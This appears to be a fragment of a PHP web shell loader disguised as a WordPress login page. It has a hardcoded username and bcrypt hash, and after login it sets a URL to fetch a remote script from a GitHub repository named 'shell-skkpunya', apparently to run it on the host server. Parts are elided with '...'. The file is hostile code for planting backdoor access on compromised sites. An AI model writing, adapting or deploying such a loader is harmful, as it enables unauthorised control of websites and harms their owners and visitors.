...
$username = "skk";
$passwordHash = '$2a$12$/WOnb3fRdXdKzH59Eq1OxOjXTACTBl4vmGc58COOAB7hSV2x7AzhS'; // Hash bcrypt
...
if (isset($_SESSION['loggedin'])) {
    $url = 'https://raw.githubusercontent.com/sekjhhh/shell-skkpunya/refs/heads/main/lts-kecee'; // Ganti URL dengan lokasi script PHP yang ingin diambil
    ...
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://res.cloudinary.com/di1pwoapk/image/upload/v1742697775/wplogo_lqlctv.jpg" alt="Logo">
                <h2>Login Form</h2>
                <?php if (isset($error)): ?>
                ...
                <form method="post">
                    ...
                    <button type="submit">Asupken</button>
                </form>
                <div class="options">
                    <label><input type="checkbox"> MR Skk</label>
                    <br>
